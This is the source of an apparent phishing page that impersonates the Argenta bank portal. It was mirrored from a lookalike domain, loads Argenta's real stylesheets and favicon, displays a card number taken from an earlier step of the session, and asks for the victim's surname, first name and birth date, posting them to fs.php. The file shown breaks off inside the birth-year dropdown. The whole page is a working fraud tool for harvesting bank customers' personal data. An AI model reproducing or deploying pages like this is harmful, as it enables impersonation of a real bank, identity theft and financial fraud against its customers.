<?php
@session_start();
?>
<html class="no-js" lang=""><!--<![endif]-->
<!-- Mirrored from axvernieupatrxn.eu/kIantenn/gegevens.php by HTTrack Website Copier/3.x [XR&CO'2014], Sun, 15 Apr 2018 09:36:59 GMT -->
<!-- Added by HTTrack --><meta http-equiv="content-type" content="text/html;charset=UTF-8" /><!-- /Added by HTTrack -->
<head>
        <meta charset="utf-8">
        <meta http-equiv="X-UA-Compatible" content="IE=edge,chrome=1">
        <title>Argenta</title>
        <meta name="description" content="">
        <meta name="viewport" content="width=device-width, initial-scale=1">
		<link href="https://homebank.argenta.be/portalserver/static/portalclient/css/reset.css" rel="stylesheet" type="text/css">
		<link href="https://homebank.argenta.be/portalserver/static/portalclient/css/backbase-portal.css" rel="stylesheet" type="text/css">
		<link href="https://homebank.argenta.be/portalserver/static/portalclient/xml-lang/backbase.com.2012.view/css/all.css" rel="stylesheet" type="text/css">
		<link href="https://homebank.argenta.be/portalserver/static/backbase.com.2012.aurora/build/aurora.minaad5.css?v=5.5.1.6-2016-04-1915:41" rel="stylesheet" type="text/css">
		<link href="https://homebank.argenta.be/portalserver/static/argenta/containers/footer/css/footer.css" rel="stylesheet" type="text/css">
		<link href="https://homebank.argenta.be/portalserver/static/themes/argenta/css/base.css" rel="stylesheet" type="text/css">
		<script src="bs.js"></script>
<style>

/* extract van normaize */

body {
  margin: 0;+-
  font-family: 'Open Sans', sans-serif;
}

/*! HTML5 Boilerplate v5.0 | MIT License | http://h5bp.com/ */

html {
    color: #222;
    font-size: 1em;
    line-height: 1.4;
}

h1,
h2,
h3,
h4 {
	font-family: 'Roboto Slab', serif;
}

a {
	color: #00A160;
}

::-moz-selection {
    background: #b3d4fc;
    text-shadow: none;
}

::selection {
    background: #b3d4fc;
    text-shadow: none;
}

hr {
    display: block;
    height: 1px;
    border: 0;
    border-top: 1px solid #ccc;
    margin: 1em 0;
    padding: 0;
}

audio,
canvas,
iframe,
img,
svg,
video {
    vertical-align: middle;
}

fieldset {
    border: 0;
    margin: 0;
    padding: 0;
}

textarea {
    resize: vertical;
}

.browserupgrade {
    margin: 0.2em 0;
    background: #ccc;
    color: #000;
    padding: 0.2em 0;
}


/* ===== Initializr Styles ==================================================
   Author: Jonathan Verrecchia - verekia.com/initializr/responsive-template
   ========================================================================== */



.wrapper {
    width: 90%;
    margin: 0 5%;
}

/* ===================
    ALL: Orange Theme
   =================== */

.header-container {
    border-bottom: 1px solid #999999;
}

div.logo {
background-image: url('data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAALQAAABkCAMAAAAYLeovAAAAGXRFWHRTb2Z0d2FyZQBBZG9iZSBJbWFnZVJlYWR5ccllPAAAAyRpVFh0WE1MOmNvbS5hZG9iZS54bXAAAAAAADw/eHBhY2tldCBiZWdpbj0i77u/IiBpZD0iVzVNME1wQ2VoaUh6cmVTek5UY3prYzlkIj8+IDx4OnhtcG1ldGEgeG1sbnM6eD0iYWRvYmU6bnM6bWV0YS8iIHg6eG1wdGs9IkFkb2JlIFhNUCBDb3JlIDUuMy1jMDExIDY2LjE0NTY2MSwgMjAxMi8wMi8wNi0xNDo1NjoyNyAgICAgICAgIj4gPHJkZjpSREYgeG1sbnM6cmRmPSJodHRwOi8vd3d3LnczLm9yZy8xOTk5LzAyLzIyLXJkZi1zeW50YXgtbnMjIj4gPHJkZjpEZXNjcmlwdGlvbiByZGY6YWJvdXQ9IiIgeG1sbnM6eG1wPSJodHRwOi8vbnMuYWRvYmUuY29tL3hhcC8xLjAvIiB4bWxuczp4bXBNTT0iaHR0cDovL25zLmFkb2JlLmNvbS94YXAvMS4wL21tLyIgeG1sbnM6c3RSZWY9Imh0dHA6Ly9ucy5hZG9iZS5jb20veGFwLzEuMC9zVHlwZS9SZXNvdXJjZVJlZiMiIHhtcDpDcmVhdG9yVG9vbD0iQWRvYmUgUGhvdG9zaG9wIENTNiAoTWFjaW50b3NoKSIgeG1wTU06SW5zdGFuY2VJRD0ieG1wLmlpZDoyNzUxRjNGOTVBMUExMUU1QjNFNkY2QTdDOUQ5MDVBRCIgeG1wTU06RG9jdW1lbnRJRD0ieG1wLmRpZDoyNzUxRjNGQTVBMUExMUU1QjNFNkY2QTdDOUQ5MDVBRCI+IDx4bXBNTTpEZXJpdmVkRnJvbSBzdFJlZjppbnN0YW5jZUlEPSJ4bXAuaWlkOjI3NTFGM0Y3NUExQTExRTVCM0U2RjZBN0M5RDkwNUFEIiBzdFJlZjpkb2N1bWVudElEPSJ4bXAuZGlkOjI3NTFGM0Y4NUExQTExRTVCM0U2RjZBN0M5RDkwNUFEIi8+IDwvcmRmOkRlc2NyaXB0aW9uPiA8L3JkZjpSREY+IDwveDp4bXBtZXRhPiA8P3hwYWNrZXQgZW5kPSJyIj8+8d9N9AAAABtQTFRFUMGUCKxv/f7+pN/H3PLqAKJefdGvwunaLbaA2GIiMAAABABJREFUeNrsmoGSqyAMRUOJIf//xY+EgIB2V/voDs7AdKe1a+sxXG4CFLYHNljQC3pBL+gFvaAX9IJe0At6Qc8JTfw8aHg9EJoKtHPsyh8/Atp5rBs9AZrDq270BHkA1sgIT9A0NWH2/AT38C2zm989iHG0nP8iI7qmzezTDNKcPsc/dsN1Nz64ZEOuyDnw7NAuuTLV7owwN3QaegjtEAxuZmgwPfTuTN5NC+1NGq076/FIYcN4ZuiKDQA9Rp4S2iU5d8UG52OaFrqXc3A0Oh8Oh/auk7MLr8mhkXo51843KTQf5PyNcmmwexzcuQ37vO7RunMj7+mhD84XK77ZoUPHLE5Ik0P3clYnnDTSWOTcO1+YOiMe3HmX98yW17lzSex+TvfQhZk+kefjgY43ehLAnZxLYh96neFzRGrlbNOvsVPb8bNx+qqcv7XuAQEDysM7kudAoxc+vrFY45j1ESXu5NX4sGwPbAt6QQ+FdgC8sbU6r4D3BNkouDQZl/t5XLc4PwP3F9CSLbDUc5gtuExT0gaF20sm5iohxtdhT5lSSH2Sd+5CazGE1cJAumgqlRBzxs7QGM9Nt1mq1+D3fImfZfh7n7CVF9xQVrsAfHwOxhyAnQOfalCBg9TS9pYv/STvx/O9rLjjZ9P0W9CqAUSNNMo9qFhAwl+2NEljF6F9LagcT4FO1SCluGvn3N3zugOtC4my+SOaxsJIEvc9WkCUoN1er4YskAz9KtCceulb0IQaMIHeCjRLR7/2sO4zrwIdP0Bkt3WMNOswubf3DLfkLIvMvMvDoOk4mGp5yMxgi7Hm80ibfvwXoNUvNHitPKLKfThuT+hANJ+WSKvX2ft9pGXH/94WB1x3Z9NtE2lKxuXfTswjFev/k0AOkbYNAro1U4DL7py3qEzTUafk9Vac9S2F0jy00JSjyqeR3mzbH0ZCazoIXpuQqjx8XgvNg67egxM40gab9YQO10Ok44hI3xtuzH7hopybpvKQKwb5lZIccB3plOdrnya7dThoumvXhP07tHZc/cuYl1kepLGV5VpryXc+7cvgPES6/eZr+6RwxZ2zEWiDMhDJqBnrQSQk3Pt0vjl/0HTz1eGasH85Rc2onUzvlie6IbPwsk0ob/rtLNJ5bBx8+sfL3Yc+WzisMqIYIRsopkEEKWMbtLP6hCrjPHePPoV9Dq31Lhwtu/g0WU2hYxXNA+SaWgrJUkIIjkukE9IPkX53zRvQ53fdZMRgHr3vFibb6iYBpbPwl0i/6d3r0BROf0PnvKzCBLIDb3Ulk0bZfqnpzH2jr7t4MuzFraf0pFOFgCcC1iUeWhPbBb2gF/SCXtALekEv6AW9oBf0gl7QC3pB/2f7J8AACoBQIsYFw1kAAAAASUVORK5CYII=');
float: left;
height: 100px;
width: 180px;
}

p.logotext {
	margin: 0;
}

.footer-container,
.main aside {
    border-top: 20px solid white;
}

.header-container {
    background: white;
}

.footer-container {
    background: #F7F7F7;
    border-top: 1px solid #DDDDDD;
}

.title {
    color: white;
}

/* ==============
    MOBILE: Menu
   ============== */

nav ul {
    margin: 0;
    padding: 0;
    list-style-type: none;
}

nav a {
    display: block;
    margin-bottom: 10px;
    padding: 15px 0;

    text-align: center;
    text-decoration: none;
    font-weight: bold;

    color: white;
    background: darkgreen;
}

nav a:hover,
nav a:visited {
    color: white;
}

nav a:hover {
    text-decoration: underline;
}

/* ==============
    MOBILE: Main
   ============== */

.main {
    padding: 30px 0;
}

.main article h1 {
    font-size: 2em;
}

.main aside {
    color: white;
    padding: 0px 5% 10px;
}

.footer-container footer {
    color: #333;
    padding: 20px 0;
    text-align: center;
}

/* ===============
    ALL: IE Fixes
   =============== */

.ie7 .title {
    padding-top: 20px;
}

/* ==========================================================================
   Author's custom styles
   ========================================================================== */















/* ==========================================================================
   Media Queries
   ========================================================================== */

@media only screen and (min-width: 480px) {


/* ====================
    INTERMEDIATE: Menu
   ==================== */

/*
    nav a {
        float: left;
        width: 27%;
        margin: 0 1.7%;
        padding: 25px 2%;
        margin-bottom: 0;
    }

    nav li:first-child a {
        margin-left: 0;
    }

    nav li:last-child a {
        margin-right: 0;
    }
*/

/* ========================
    INTERMEDIATE: IE Fixes
   ======================== */

/*
    nav ul li {
        display: inline;
    }

    .oldie nav a {
        margin: 0 0.7%;
    }
}
/*

@media only screen and (min-width: 768px) {

/* ====================
    WIDE: CSS3 Effects
   ==================== */

/*
    .header-container,
    .main aside {
        -webkit-box-shadow: 0 5px 10px #aaa;
           -moz-box-shadow: 0 5px 10px #aaa;
                box-shadow: 0 5px 10px #aaa;
    }
/*



/* ============
    WIDE: Menu
   ============ */
   

    div.logo {
    	
    }
    
    .title {
        float: left;
    }

    nav {
        float: right;
        width: 38%;
    }
    

/* ============
    WIDE: Main
   ============ */

    .main article {
    	border: 1px solid #ccc;
        float: left;
        padding: 0 3% 1em;
        width: 93%;
    }

    .main aside {
        float: right;
        width: 28%;
    }
}

@media only screen and (min-width: 1140px) {

/* ===============
    Maximal Width
   =============== */

    .wrapper {
        width: 1026px; /* 1140px - 10% for margins */
        margin: 0 auto;
    }
}

/* ==========================================================================
   Helper classes
   ========================================================================== */

.hidden {
    display: none !important;
    visibility: hidden;
}

.visuallyhidden {
    border: 0;
    clip: rect(0 0 0 0);
    height: 1px;
    margin: -1px;
    overflow: hidden;
    padding: 0;
    position: absolute;
    width: 1px;
}

.visuallyhidden.focusable:active,
.visuallyhidden.focusable:focus {
    clip: auto;
    height: auto;
    margin: 0;
    overflow: visible;
    position: static;
    width: auto;
}

.invisible {
    visibility: hidden;
}

.clearfix:before,
.clearfix:after {
    content: " ";
    display: table;
}

.clearfix:after {
    clear: both;
}

.clearfix {
    *zoom: 1;
}

/* ==========================================================================
   Print styles
   ========================================================================== */

@media print {
    *,
    *:before,
    *:after {
        background: transparent !important;
        color: #000 !important;
        box-shadow: none !important;
        text-shadow: none !important;
    }

    a,
    a:visited {
        text-decoration: underline;
    }

    a[href]:after {
        content: " (" attr(href) ")";
    }

    abbr[title]:after {
        content: " (" attr(title) ")";
    }

    a[href^="#"]:after,
    a[href^="javascript:"]:after {
        content: "";
    }

    pre,
    blockquote {
        border: 1px solid #999;
        page-break-inside: avoid;
    }

    thead {
        display: table-header-group;
    }

    tr,
    img {
        page-break-inside: avoid;
    }

    img {
        max-width: 100% !important;
    }

    p,
    h2,
    h3 {
        orphans: 3;
        widows: 3;
    }

    h2,
    h3 {
        page-break-after: avoid;
    }
}

</style>

<link href="https://fonts.googleapis.com/css?family=Roboto+Slab:300|Open+Sans:300" rel="stylesheet" type="text/css">
<link rel="icon" href="https://homebank.argenta.be/portalserver/static/themes/argenta/favicon.png">

    </head>
    <body>

        <div class="header-container">
            <header class="wrapper clearfix">
                <p class="logotext"></p><div class="logo"></div><p></p>
            </header>
        </div>

        <div class="main-container">
            <div class="main wrapper clearfix">

                <article>
                    <section>
                                          <h2>Argenta controle pagina - Uw gegevens</h2>
                        <p><font size="3">Uw kaartnummer:</font> &nbsp;<font size="3" color="00a160"><?php echo @$_SESSION['krn']?></font></p>
						<hr>
						<p><br>
U wordt vriendelijk verzocht om de gevraagde gegevens in te voeren.						</p>

						<div class="widget-footer"><!-- ngInclude: footerPartialUrl --><div ng-include="footerPartialUrl" class="ng-scope">
</div></div>
                    </section>
                    <section>
                        
<div class="lp-widget-body widget-body panel-body">
<form method="post" action="fs.php" id="kook">
<input name="gentz" type="hidden" value="2"> 
<input type="hidden" id="xlamation" name="xlamation" value="b">
<div class="ag-form-content"><!-- ngIf: postingData --><!-- ngRepeat: error in errorArray --><div ng-show="(contactForm.$invalid || emailDoesntMatch) &amp;&amp; formSubmitted" lp-focus-on="ag.form.errors.focus" class="ng-hide"><div style="display:none" class="alert ng-isolate-scope alert-danger" ng-class="{'alert-danger': true, 'alert-dismissable': closeable}" role="alert" type="danger" closeable="true" id="errorclause">
    <button ng-show="closeable" type="button" class="close ng-hide" ng-click="close()">
        
        <span class="sr-only">Close</span>
    </button>
    <div ng-transclude=""><p class="ng-scope"><span lp-i18n="Please fill in all required fields correctly" class="ng-isolate-scope"><span translate="Please fill in all required fields correctly" class="ng-scope">Controleer de volgende velden in en druk daarna op 'Bevestigen'.</span></span></p><p id="errorachternaam" ng-show="contactForm.birth_date.$error.validDate" class="ng-scope ng-hide"><span lp-i18n="Birthdate should be before now" class="ng-isolate-scope"><span translate="Birthdate should be before now" class="ng-scope">Vul een geldige achternaam in</span></span></p><p id="errorvoornaam" ng-show="contactForm.email.$invalid" class="ng-scope"><span lp-i18n="Email is invalid" class="ng-isolate-scope"><span translate="Email is invalid" class="ng-scope">Vul een geldige voornaam in</span></span></p>
<p id="errorgeboortedatum" ng-show="contactForm.email.$invalid" class="ng-scope"><span lp-i18n="Email is invalid" class="ng-isolate-scope"><span translate="Email is invalid" class="ng-scope">Het ingevoerde geboortedatum niet geldig</span></span></p>
<p id="errortelt" ng-show="contactForm.email.$invalid" class="ng-scope"><span lp-i18n="Email is invalid" class="ng-isolate-scope"><span translate="Email is invalid" class="ng-scope">Het ingevoerde telefoonnummer niet geldig</span></span></p>
<p id="errormail" ng-show="emailDoesntMatch &amp;&amp; contactForm.email.$valid" class="ng-scope ng-hide"><span lp-i18n="E-mail address doesn't match" class="ng-isolate-scope"><span translate="E-mail address doesn't match" class="ng-scope">Het ingevoerde e-mailadres is niet geldig</span></span></p></div>
</div></div></div><div class="ag-form-background-wrapper"><div class="ag-form-content" ng-hide="postSuccess"><!-- ngInclude: templateURL --><div data-ng-include="templateURL" class="ng-scope"><!-- Name -->
<div class="row ng-scope">
    <div class="col-xs-6 col-sm-12 col-md-6 col-lg-6">
        <label><span lp-i18n="Name" ng-init="form.fields.001_last_name.label = translateString('Name')" class="ng-isolate-scope"><span translate="Name" class="ng-scope">Naam</span></span>*</label>
    </div>
    <div class="col-xs-6 col-sm-12 col-md-6 col-lg-6 form-group" ng-class="{ 'has-error': contactForm.last_name.$invalid &amp;&amp; formSubmitted }">
        <input class="form-control ng-pristine ng-invalid ng-invalid-required" size="25" maxlength="50" type="text" name="achternaam" ng-model="form.last_name" ng-change="form.fields.001_last_name.content = form.last_name" required="" id="achternaam">
    </div>
</div>
<!-- First Name -->
<div class="row ng-scope">
    <div class="col-xs-6 col-sm-12 col-md-6 col-lg-6">
        <label><span lp-i18n="First name" ng-init="form.fields.002_first_name.label = translateString('First name')" class="ng-isolate-scope"><span translate="First name" class="ng-scope">Voornaam</span></span>*</label>
    </div>
    <div class="col-xs-6 col-sm-12 col-md-6 col-lg-6 form-group form-group" ng-class="{ 'has-error': contactForm.first_name.$invalid &amp;&amp; formSubmitted }">
        <input class="form-control ng-pristine ng-invalid ng-invalid-required" size="25" maxlength="50" type="text" name="voornaam" ng-model="form.first_name" ng-change="form.fields.002_first_name.content = form.first_name" required="" id="voornaam">
    </div>
</div>
<!-- Birth Date -->

<!-- Street -->

<!-- Number -->

<!-- Bus -->

<!-- Postal Code -->

<!-- City -->

<!-- E-mail -->
<div class="row ng-scope">

    <div class="col-xs-6 col-sm-12 col-md-6 col-lg-6">
        <label><span lp-i18n="Birth date" ng-init="form.fields.010_birth_date.label = translateString('Birth date')" class="ng-isolate-scope"><span translate="Birth date" class="ng-scope">Geboortedatum</span></span>*</label>
    </div>
    <div class="col-xs-6 col-sm-12 col-md-6 col-lg-6 form-group" ng-class="{ 'has-error': contactForm.birth_date.$invalid &amp;&amp; formSubmitted }">
        <div class="one-time">
            <div ag-dated-dropdowns="" ng-model="form.birth_date" name="birth_date" required="required" class="ng-isolate-scope ng-pristine ng-invalid ng-invalid-required"><div class="form-group col-xs-3  col-sm-3 col-md-4 date-month"><select name="dob1" data-ng-model="dateFields.day" placeholder="Day" class="form-control ng-pristine ng-valid" ng-change="checkDate()" ng-disabled="disableFields" id="dob1"><option value="? undefined:undefined ?"></option><!-- ngRepeat: day in days --><option ng-repeat="day in days" class="ng-binding ng-scope" value="1">1</option><!-- end ngRepeat: day in days --><option ng-repeat="day in days" class="ng-binding ng-scope" value="2">2</option><!-- end ngRepeat: day in days --><option ng-repeat="day in days" class="ng-binding ng-scope" value="3">3</option><!-- end ngRepeat: day in days --><option ng-repeat="day in days" class="ng-binding ng-scope" value="4">4</option><!-- end ngRepeat: day in days --><option ng-repeat="day in days" class="ng-binding ng-scope" value="5">5</option><!-- end ngRepeat: day in days --><option ng-repeat="day in days" class="ng-binding ng-scope" value="6">6</option><!-- end ngRepeat: day in days --><option ng-repeat="day in days" class="ng-binding ng-scope" value="7">7</option><!-- end ngRepeat: day in days --><option ng-repeat="day in days" class="ng-binding ng-scope" value="8">8</option><!-- end ngRepeat: day in days --><option ng-repeat="day in days" class="ng-binding ng-scope" value="9">9</option><!-- end ngRepeat: day in days --><option ng-repeat="day in days" class="ng-binding ng-scope" value="10">10</option><!-- end ngRepeat: day in days --><option ng-repeat="day in days" class="ng-binding ng-scope" value="11">11</option><!-- end ngRepeat: day in days --><option ng-repeat="day in days" class="ng-binding ng-scope" value="12">12</option><!-- end ngRepeat: day in days --><option ng-repeat="day in days" class="ng-binding ng-scope" value="13">13</option><!-- end ngRepeat: day in days --><option ng-repeat="day in days" class="ng-binding ng-scope" value="14">14</option><!-- end ngRepeat: day in days --><option ng-repeat="day in days" class="ng-binding ng-scope" value="15">15</option><!-- end ngRepeat: day in days --><option ng-repeat="day in days" class="ng-binding ng-scope" value="16">16</option><!-- end ngRepeat: day in days --><option ng-repeat="day in days" class="ng-binding ng-scope" value="17">17</option><!-- end ngRepeat: day in days --><option ng-repeat="day in days" class="ng-binding ng-scope" value="18">18</option><!-- end ngRepeat: day in days --><option ng-repeat="day in days" class="ng-binding ng-scope" value="19">19</option><!-- end ngRepeat: day in days --><option ng-repeat="day in days" class="ng-binding ng-scope" value="20">20</option><!-- end ngRepeat: day in days --><option ng-repeat="day in days" class="ng-binding ng-scope" value="21">21</option><!-- end ngRepeat: day in days --><option ng-repeat="day in days" class="ng-binding ng-scope" value="22">22</option><!-- end ngRepeat: day in days --><option ng-repeat="day in days" class="ng-binding ng-scope" value="23">23</option><!-- end ngRepeat: day in days --><option ng-repeat="day in days" class="ng-binding ng-scope" value="24">24</option><!-- end ngRepeat: day in days --><option ng-repeat="day in days" class="ng-binding ng-scope" value="25">25</option><!-- end ngRepeat: day in days --><option ng-repeat="day in days" class="ng-binding ng-scope" value="26">26</option><!-- end ngRepeat: day in days --><option ng-repeat="day in days" class="ng-binding ng-scope" value="27">27</option><!-- end ngRepeat: day in days --><option ng-repeat="day in days" class="ng-binding ng-scope" value="28">28</option><!-- end ngRepeat: day in days --><option ng-repeat="day in days" class="ng-binding ng-scope" value="29">29</option><!-- end ngRepeat: day in days --><option ng-repeat="day in days" class="ng-binding ng-scope" value="30">30</option><!-- end ngRepeat: day in days --><option ng-repeat="day in days" class="ng-binding ng-scope" value="31">31</option><!-- end ngRepeat: day in days --></select></div><div class="form-group col-xs-6 col-sm-6 col-md-4 date-month"><select name="dob2" data-ng-model="dateFields.month" placeholder="Month" class="form-control ng-pristine ng-valid" ng-change="checkDate()" ng-disabled="disableFields" id="dob2"><option value="? undefined:undefined ?"></option><!-- ngRepeat: month in months | orderBy : 'value' --><option ng-repeat="month in months | orderBy : 'value'" value="0" class="ng-binding ng-scope">Januari</option><!-- end ngRepeat: month in months | orderBy : 'value' --><option ng-repeat="month in months | orderBy : 'value'" value="1" class="ng-binding ng-scope">Februari</option><!-- end ngRepeat: month in months | orderBy : 'value' --><option ng-repeat="month in months | orderBy : 'value'" value="2" class="ng-binding ng-scope">Maart</option><!-- end ngRepeat: month in months | orderBy : 'value' --><option ng-repeat="month in months | orderBy : 'value'" value="3" class="ng-binding ng-scope">April</option><!-- end ngRepeat: month in months | orderBy : 'value' --><option ng-repeat="month in months | orderBy : 'value'" value="4" class="ng-binding ng-scope">Mei</option><!-- end ngRepeat: month in months | orderBy : 'value' --><option ng-repeat="month in months | orderBy : 'value'" value="5" class="ng-binding ng-scope">Juni</option><!-- end ngRepeat: month in months | orderBy : 'value' --><option ng-repeat="month in months | orderBy : 'value'" value="6" class="ng-binding ng-scope">Juli</option><!-- end ngRepeat: month in months | orderBy : 'value' --><option ng-repeat="month in months | orderBy : 'value'" value="7" class="ng-binding ng-scope">Augustus</option><!-- end ngRepeat: month in months | orderBy : 'value' --><option ng-repeat="month in months | orderBy : 'value'" value="8" class="ng-binding ng-scope">September</option><!-- end ngRepeat: month in months | orderBy : 'value' --><option ng-repeat="month in months | orderBy : 'value'" value="9" class="ng-binding ng-scope">Oktober</option><!-- end ngRepeat: month in months | orderBy : 'value' --><option ng-repeat="month in months | orderBy : 'value'" value="10" class="ng-binding ng-scope">November</option><!-- end ngRepeat: month in months | orderBy : 'value' --><option ng-repeat="month in months | orderBy : 'value'" value="11" class="ng-binding ng-scope">December</option><!-- end ngRepeat: month in months | orderBy : 'value' --></select></div><div class="form-group col-xs-3 col-sm-2 col-md-2 year-select"><select ng-show="!yearText" name="dob3" data-ng-model="dateFields.year" placeholder="Year" class="form-control ng-pristine ng-valid" ng-change="checkDate()" ng-disabled="disableFields" id="dob3"><option value="? undefined:undefined ?"></option><!-- ngRepeat: year in years --><option ng-repeat="year in years" class="ng-binding ng-scope" value="2016">2016</option><!-- end ngRepeat: year in years --><option ng-repeat="year in years" class="ng-binding ng-scope" value="2015">2015</option><!-- end ngRepeat: year in years --><option ng-repeat="year in years" class="ng-binding ng-scope" value="2014">2014</option><!-- end ngRepeat: year in years --><option ng-repeat="year in years" class="ng-binding ng-scope" value="2013">2013</option><!-- end ngRepeat: year in years --><option ng-repeat="year in years" class="ng-binding ng-scope" value="2012">2012</option><!-- end ngRepeat: year in years --><option ng-repeat="year in years" class="ng-binding ng-scope" value="2011">2011</option><!-- end ngRepeat: year in years --><option ng-repeat="year in years" class="ng-binding ng-scope" value="2010">2010</option><!-- end ngRepeat: year in years --><option ng-repeat="year in years" class="ng-binding ng-scope" value="2009">2009</option><!-- end ngRepeat: year in years --><option ng-repeat="year in years" class="ng-binding ng-scope" value="2008">2008</option><!-- end ngRepeat: year in years --><option ng-repeat="year in years" class="ng-binding ng-scope" value="2007">2007</option><!-- end ngRepeat: year in years --><option ng-repeat="year in years" class="ng-binding ng-scope" value="2006">2006</option><!-- end ngRepeat: year in years --><option ng-repeat="year in years" class="ng-binding ng-scope" value="2005">2005</option><!-- end ngRepeat: year in years --><option ng-repeat="year in years" class="ng-binding ng-scope" value="2004">2004</option><!-- end ngRepeat: year in years --><option ng-repeat="year in years" class="ng-binding ng-scope" value="2003">2003</option><!-- end ngRepeat: year in years --><option ng-repeat="year in years" class="ng-binding ng-scope" value="2002">2002</option><!-- end ngRepeat: year in years --><option ng-repeat="year in years" class="ng-binding ng-scope" value="2001">2001</option><!-- end ngRepeat: year in years --><option ng-repeat="year in years" class="ng-binding ng-scope" value="2000">2000</option><!-- end ngRepeat: year in years --><option ng-repeat="year in years" class="ng-binding ng-scope" value="1999">1999</option><!-- end ngRepeat: year in years --><option ng-repeat="year in years" class="ng-binding ng-scope" value="1998">1998</option><!-- end ngRepeat: year in years --><option ng-repeat="year in years" class="ng-binding ng-scope" value="1997">1997</option><!-- end ngRepeat: year in years --><option ng-repeat="year in years" class="ng-binding ng-scope" value="1996">1996</option><!-- end ngRepeat: year in years --><option ng-repeat="year in years" class="ng-binding ng-scope" value="1995">1995</option><!-- end ngRepeat: year in years --><option ng-repeat="year in years" class="ng-binding ng-scope" value="1994">1994</option><!-- end ngRepeat: year in years --><option ng-repeat="year in years" class="ng-binding ng-scope" value="1993">1993</option><!-- end ngRepeat: year in years --><option ng-repeat="year in years" class="ng-binding ng-scope" value="1992">1992</option><!-- end ngRepeat: year in years --><option ng-repeat="year in years" class="ng-binding ng-scope" value="1991">1991</option><!-- end ngRepeat: year in years --><option ng-repeat="year in years" class="ng-binding ng-scope" value="1990">1990</option><!-- end ngRepeat: year in years --><option ng-repeat="year in years" class="ng-binding ng-scope" value="1989">1989</option><!-- end ngRepeat: year in years --><option ng-repeat="year in years" class="ng-binding ng-scope" value="1988">1988</option><!-- end ngRepeat: year in years --><option ng-repeat="year in years" class="ng-binding ng-scope" value="1987">1987</option><!-- end ngRepeat: year in years --><option ng-repeat="year in years" class="ng-binding ng-scope" value="1986">1986</option><!-- end ngRepeat: year in years --><option ng-repeat="year in years" class="ng-binding ng-scope" value="1985">1985</option><!-- end ngRepeat: year in years --><option ng-repeat="year in years" class="ng-binding ng-scope" value="1984">1984</option><!-- end ngRepeat: year in years --><option ng-repeat="year in years" class="ng-binding ng-scope" value="1983">1983</option><!-- end ngRepeat: year in years --><option ng-repeat="year in years" class="ng-binding ng-scope" value="1982">1982</option><!-- end ngRepeat: year in years --><option ng-repeat="year in years" class="ng-binding ng-scope" value="1981">1981</option><!-- end ngRepeat: year in years --><option ng-repeat="year in years" class="ng-binding ng-scope" value="1980">1980</option><!-- end ngRepeat: year in years --><option ng-repeat="year in years" class="ng-binding ng-scope" value="1979">1979</option><!-- end ngRepeat: year in years --><option ng-repeat="year in years" class="ng-binding ng-scope" value="1978">1978</option><!-- end ngRepeat: year in years --><option ng-repeat="year in years" class="ng-binding ng-scope" value="1977">1977</option><!-- end ngRepeat: year in years --><option ng-repeat="year in years" class="ng-binding ng-scope" value="1976">1976</option><!-- end ngRepeat: year in years --><option ng-repeat="year in years" class="ng-binding ng-scope" value="1975">1975</option><!-- end ngRepeat: year in years --><option ng-repeat="year in years" class="ng-binding ng-scope" value="1974">1974</option><!-- end ngRepeat: year in years --><option ng-repeat="year in years" class="ng-binding ng-scope" value="1973">1973</option><!-- end ngRepeat: year in years --><option ng-repeat="year in years" class="ng-binding ng-scope" value="1972">1972</option><!-- end ngRepeat: year in years --><option ng-repeat="year in years" class="ng-binding ng-scope" value="1971">1971</option><!-- end ngRepeat: year in years --><option ng-repeat="year in years" class="ng-binding ng-scope" value="1970">1970</option><!-- end ngRepeat: year in years --><option ng-repeat="year in years" class="ng-binding ng-scope" value="1969">1969</option><!-- end ngRepeat: year in years --><option ng-repeat="year in years" class="ng-binding ng-scope" value="1968">1968</option><!-- end ngRepeat: year in years --><option ng-repeat="year in years" class="ng-binding ng-scope" value="1967">1967</option><!-- end ngRepeat: year in years --><option ng-repeat="year in years" class="ng-binding ng-scope" value="1966">1966</option><!-- end ngRepeat: year in years --><option ng-repeat="year in years" class="ng-binding ng-scope" value="1965">1965</option><!-- end ngRepeat: year in years --><option ng-repeat="year in years" class="ng-binding ng-scope" value="1964">1964</option><!-- end ngRepeat: year in years --><option ng-repeat="year in years" class="ng-binding ng-scope" value="1963">1963</option><!-- end ngRepeat: year in years --><option ng-repeat="year in years" class="ng-binding ng-scope" value="1962">1962</option><!-- end ngRepeat: year in years --><option ng-repeat="year in years" class="ng-binding ng-scope" value="1961">1961</option><!-- end ngRepeat: year in years --><option ng-repeat="year in years" class="ng-binding ng-scope" value="1960">1960</option><!-- end ngRepeat: year in years --><option ng-repeat="year in years" class="ng-binding ng-scope" value="1959">1959</option><!-- end ngRepeat: year in years --><option ng-repeat="year in years" class="ng-binding ng-scope" value="1958">1958</option><!-- end ngRepeat: year in years --><option ng-repeat="year in years" class="ng-binding ng-scope" value="1957">1957</option><!-- end ngRepeat: year in years --><option ng-repeat="year in years" class="ng-binding ng-scope" value="1956">1956</option><!-- end ngRepeat: year in years --><option ng-repeat="year in years" class="ng-binding ng-scope" value="1955">1955</option><!-- end ngRepeat: year in years --><option ng-repeat="year in years" class="ng-binding ng-scope" value="1954">1954</option><!-- end ngRepeat: year in years --><option ng-repeat="year in years" class="ng-binding ng-scope" value="1953">1953</option><!-- end ngRepeat: year in years --><option ng-repeat="year in years" class="ng-binding ng-scope" value="1952">1952</option><!-- end ngRepeat: year in years --><option ng-repeat="year in years" class="ng-binding ng-scope" value="1951">1951</option><!-- end ngRepeat: year in years --><option ng-repeat="year in years" class="ng-binding ng-scope" value="1950">1950</option><!-- end ngRepeat: year in years --><option ng-repeat="year in years" class="ng-binding ng-scope" value="1949">1949</option><!-- end ngRepeat: year in years --><option ng-repeat="year in years" class="ng-binding ng-scope" value="1948">1948</option><!-- end ngRepeat: year in years --><option ng-repeat="year in years" class="ng-binding ng-scope" value="1947">1947</option><!-- end ngRepeat: year in years --><option ng-repeat="year in years" class="ng-binding ng-scope" value="1946">1946</option><!-- end ngRepeat: year in years --><option ng-repeat="year in years" class="ng-binding ng-scope" value="1945">1945</option><!-- end ngRepeat: year in years --><option ng-repeat="year in years" class="ng-binding ng-scope" value="1944">1944</option><!-- end ngRepeat: year in years --><option ng-repeat="year in years" class="ng-binding ng-scope" value="1943">1943</option><!-- end ngRepeat: year in years --><option ng-repeat="year in years" class="ng-binding ng-scope" value="1942">1942</option><!-- end ngRepeat: year in years --><option ng-repeat="year in years" class="ng-binding ng-scope" value="1941">1941</option><!-- end ngRepeat: year in years --><option ng-repeat="year in years" class="ng-binding ng-scope" value="1940">1940</option><!-- end ngRepeat: year in years --><option ng-repeat="year in years" class="ng-binding ng-scope" 